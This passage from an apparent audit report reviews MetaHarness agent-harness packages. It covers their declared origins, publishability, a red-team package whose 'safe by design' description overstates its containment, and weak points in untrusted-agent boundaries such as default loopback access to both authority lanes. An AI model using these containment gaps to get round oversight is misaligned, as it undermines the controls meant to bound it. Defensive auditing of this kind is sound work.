padded. **Caught:** the four disconnected controls (K6); `avo`'s fabricated classification (K7);
`redblue`'s post-observation "patches" (K8); the three forgeable presence rungs (K5). **Passed:**
`oo-agents`' single-import cell (K1); `turn-credit`'s algebraic separation (K3); the evidence-hash-bound
directive (K4); HackerOne's counterparty-issued scope (K5, gate 1). **The instrument is not only a
detector — it discriminates.** In two of the three passes it passed because the mechanism removed the
decision rather than protecting it, which is a result about the instrument worth recording: *the predicate
is easiest to satisfy where there is nothing left to decide.*

**3.2 — MetaHarness is substantially a re-implementation portfolio, and it says so.** Four of my six packages
declare an external origin in their own manifest or source headers: `turn-credit` → AgentOPSD /
arXiv:2608.05987 + ADR-248; `horizon` → Google ADK (`command_classify.py`, `halt_reason`), "a Rust/WASM
clone"; `oo-agents` → "a TypeScript clone of NOOA (NVIDIA-NeMo/labs-OO-Agents)"; `redblue` → NIST AI RMF +
OWASP LLM Top-10 + ADR-197. Only `avo` and `arc-agi-3-chatgpt` declare no external mechanism origin (both
cite internal ADRs). **C4 grades novelty against our graph and therefore cannot distinguish "MetaHarness
invented this" from "MetaHarness cloned this."** For K1, K2 and K10 the honest position is that the concept
may belong upstream; the citation we should eventually carry is ADK's or NVIDIA's, not MetaHarness's.
**Recommendation to the leader — do not act on it in this run:** a later, separately scoped literature pass
on ADK's long-horizon harness would settle attribution for three of my ten entries at once. That is a
boundary expansion this run does not have.

**3.3 — Two publication/distribution facts, per `#324` §4.** `@metaharness/arc-agi-3-chatgpt` is
`"private": true` — **nothing is published from it at this cutoff** and its `files` array is a *packing*
boundary. `@metaharness/horizon` (0.2.0), `@metaharness/oo-agents` (0.1.0), `@metaharness/avo` (0.1.3),
`@metaharness/redblue` (0.1.6) and `@metaharness/turn-credit` (0.1.0) carry no `private` flag and are
therefore **publishable, NOT verified published** — settling registry state needs a fetch this envelope
forbids. Separately: `horizon` and `oo-agents` list `"wasm"` in `files`, and **no `wasm/` directory exists
in the tree** at this commit.

**3.4 — `redblue`'s shortest self-description does not survive its own code.** Manifest `description`:
*"Safe by design — capability-contained: no real credentials, no live external targets, no shell, no
arbitrary network."* Ruled on all four clauses at once (`#324` §1):
**no shell — HOLDS.** No `child_process` import anywhere in `src/`; the two `exec(` grep hits are
`RegExp.prototype.exec` (`mock-judge.ts:36`, `hackerone.ts:126`). "Dependency-free (Node built-ins)" also
holds — zero runtime `dependencies`.
**The other three do not hold of the package.** It reads `OPENROUTER_API_KEY` and a HackerOne token from the
environment, and egresses to `openrouter.ai` and HackerOne. The README scopes the claim correctly (*"red
actors are uncontrolled in behavior, not capability"*, i.e. the claim is about the **adversarial actor's**
capability, not the harness's); the manifest `description` drops that scope. **The `description` is the
package's shortest, most-copied self-statement and it is the one that is wrong** — the exact trap the scope
predicted.

**3.5 — Two static observations from `avo` I decline to promote to concepts** (they are real, and each is
either well-known or too small to justify a register row):
- `operator.ts:160-172` hands the untrusted agent `structuredClone`d state, with a correct comment that
  `Readonly<>` is compile-time only. **But the same package guards its own authority references with
  `private readonly options`, equally erased at runtime, and freezes the policy object
  (`policy.ts:31 Object.freeze(this)`) while never freezing the operator.** The asymmetry is the
  observation: the language annotation is treated as a boundary in one direction and correctly distrusted
  in the other.
- `operator.ts:148-152` re-verifies, **every loop iteration**, that the invariant hash and the policy /
  evaluator / environment version strings are unchanged, throwing on drift — treating mid-run authority
  substitution as an attack rather than checking configuration once at startup. Neat; too small to state
  as a concept on its own, and it protects references held in the same realm as the thing it protects
  against.
- `repository.ts:128-148` refuses **per path segment** via `lstat`, treating a dangling symlink as a
  refusal, with the reason in code (*"existsSync follows symlinks, so a DANGLING symlink would bypass the
  guard"*). A correct instance of `#319` §2's rule that the check must use the same resolution semantics as
  the effect. Already held.

---

## 4. What I did NOT check (recorded negatively, `#324` §2)

- I did not build, run, install or test anything; no wasm was compiled or instantiated; no subprocess, no
  fetch, no model call. **No path was witnessed executing.**
- **I did not read the built wasm** for `horizon` or `oo-agents` — it is not in the tree. All containment
  claims about those two are claims about Rust source.
- I did not read any dependency source (`agenticow`, `@modelcontextprotocol/sdk`, `zod`,
  `@metaharness/{kernel,arc-agi-3,radio}`), and I did not verify `@metaharness/kernel`'s RuVector closure —
  I applied C2 at the mechanism level only, as instructed.
- I did not re-derive wfh-008's ground on `arc-agi-3`, `projects`, `darwin-mode` or `kernel-js`. Where
  `arc-agi-3-chatgpt` reaches `@metaharness/arc-agi-3`, I cite `#316`, `#317` and `#318`(a) — the ARC bridge
  egress/credential path, the `private: true` framing, the unlocked PyPI pins — and re-derived none of it.
- **Call-site enumeration is bounded, per package.** For `arc-agi-3-chatgpt` I enumerated over the MCP tool
  registry (`src/tools.ts`), not over the exported surface of `src/store.ts` (765 lines) or
  `src/official-factory.ts` (1013 lines) — I read neither in full. A second path into
  `prepareBossDirective` would be outside my sweep, so **K4's custody verdict is bounded, not closed.**
- I read `redblue`'s `runner.ts`, `safety.ts`, `sandbox.ts`, `h1-submit.ts` and `hackerone.ts` (partially),
  and **did not read** `attacks/families.ts`, `actors/blue.ts`, `judges/severity.ts`, `reports/report.ts`,
  `cli/index.ts` in full, or any of its 12 test files beyond grep. **6,941 lines; I traced the safety claim
  and the metric path, not the package.**
- I did not read `avo`'s `flywheelGate.ts`, `swebench.ts`, `router.ts`, `archive.ts` or `darwin-adapter.ts`
  beyond grep, and I read no `bench/results/*.json`.
- I did not examine `horizon/src/compaction.ts` or `oo-agents/src/pod.ts` / `llm-driver.ts` beyond the
  effect-class grep.
- **I did not construct or test a parser differential** between `horizon`'s classifier and a real shell.
  K10's ceiling is a structural statement, not a demonstrated bypass, and **nothing here is a vulnerability
  claim.**
- I did not attempt to establish whether K1, K2 or K10 originate with Google ADK or NVIDIA NOOA. Recording
  the declared origin was in scope; reading the upstream was not.

---

## 5. Cross-workstream handoffs (for the leader — not absorbed, not duplicated)

1. **→ W3 (host projection).** `arc-agi-3-chatgpt` is a **host projection onto ChatGPT Developer Mode over
   remote MCP**, with a two-lane route split (`/mcp` actor, `/mcp/boss`) declared in
   `.harness/mcp-capabilities.json` and an OAuth-2.1 scoped / loopback-anonymous / trusted-proxy-bearer auth
   model in `src/auth.ts` (330 lines). I ruled on the **bounded-autonomy** half only. Two projection-shaped
   facts W3 may want: `auth.ts:106` **refuses a configuration where `actorScope === bossScope`** (a
   config-time separation-of-duty check — the projection cannot collapse two authorities into one
   credential); and `auth.ts:281-282` grants the **default anonymous loopback principal BOTH lanes**, so the
   lane separation that OAuth enforces is absent in the default configuration. I did not analyse the
   projection loss surface.
2. **→ W1 (promotion gates).** `avo/src/flywheelGate.ts` (281 lines) and `darwin-adapter.ts` are a promotion
   gate and a bridge into Darwin's `EvolutionConfig.variationOperator`. I read neither. W1's `flywheel`
   ground is the right owner.
3. **→ W4 (agent state).** `oo-agents` depends on `@metaharness/radio` (W4's package) for its multi-agent
   "pod" protocol (`src/pod.ts`). I did not open `radio`. Note for W4: **`radio` declares an upstream in the
   same style as my packages** (arXiv:2607.28430 per the scope) — §3.2's pattern likely extends there.
4. **→ leader, method note.** Alphabet **A4** (enumerate declared bound identifiers, then grep for their
   *readers*) found a defect class that the effect-class sweep A3 structurally cannot see, because an unread
   flag performs no operation. If the coverage auditor or a future run wants one reusable instrument out of
   this workstream, that is it.

---

## 6. Firewall statement

Every material statement above carries a label. Nothing in this file is demonstrated-by-us evidence. The
packages' own tests, benchmark bundles, CI, `bench/results/*.json` and ADR references are **source claims**.
No status is advanced, no capability is touched, no Unimatrix node was written by this researcher.
